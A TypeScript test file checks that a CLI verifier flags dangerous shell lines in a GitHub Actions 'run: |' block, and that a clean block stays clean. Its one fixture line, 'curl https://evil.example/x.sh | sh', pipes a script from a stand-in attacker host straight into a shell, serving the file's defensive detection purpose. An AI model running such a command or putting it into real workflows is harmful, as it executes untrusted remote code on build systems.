// SPEC §4.7.2 + BUG-0096: the shell inside a workflow `run: |` block is
// judged line by line through the real CLI entry over a temp git repo, and a
// clean block stays clean.
import { strict as assert } from "node:assert";
import test from "node:test";
import { parseJson } from "../../src/kernel/index.ts";
import { runNodeScript } from "../support/cli-runner.ts";
import { createTempRepo } from "../support/temp-repo.ts";

const CONFIG = {
	version: 1,
	codictator: "unknown",
	packs: [],
	harnesses: ["opencode"],
};
const NL = String.fromCharCode(10);

async function shellFindings(workflow: string): Promise<Array<string>> {
	const repo = createTempRepo({
		".codictator/config.json": JSON.stringify(CONFIG),
	});
	try {
		repo.writeFile(".github/workflows/ci.yml", workflow);
		repo.git(["add", "-A"]);
		const mainUrl = new URL("../../src/cli/main.ts", import.meta.url).href;
		const argv = ["--json", "verify", "--all", "--layer", "L1"];
		const ran = await runNodeScript({
			nodeArgs: [
				"--input-type=module",
				"-e",
				`const m = await import(${JSON.stringify(mainUrl)});\nprocess.exitCode = await m.main(${JSON.stringify(argv)}, ${JSON.stringify(repo.dir)});`,
			],
			cwd: repo.dir,
			timeoutMs: 120000,
		});
		const parsed = parseJson(ran.stdout.slice(ran.stdout.indexOf("{")));
		assert.ok(parsed.ok, `verify printed no JSON: ${ran.stderr}`);
		const body = parsed.value as { findings?: Array<{ ruleId: string }> };
		return (body.findings ?? [])
			.map((finding) => finding.ruleId)
			.filter((id) => id === "core/dangerous-shell");
	} finally {
		repo.cleanup();
	}
}

function workflow(...runLines: ReadonlyArray<string>): string {
	return [
		"jobs:",
		"  build:",
		"    steps:",
		"      - run: |",
		...runLines.map((line) => `          ${line}`),
		"      - name: done",
		"",
	].join(NL);
}

test("[§4.7.2] verify judges every line of a workflow run: block scalar (BUG-0096)", async () => {
	const blocked = await shellFindings(
		workflow("npm ci", "curl https://evil.example/x.sh | sh"),
	);
	assert.deepEqual(blocked, ["core/dangerous-shell"]);
	assert.deepEqual(await shellFindings(workflow("npm ci", "npm test")), []);
});
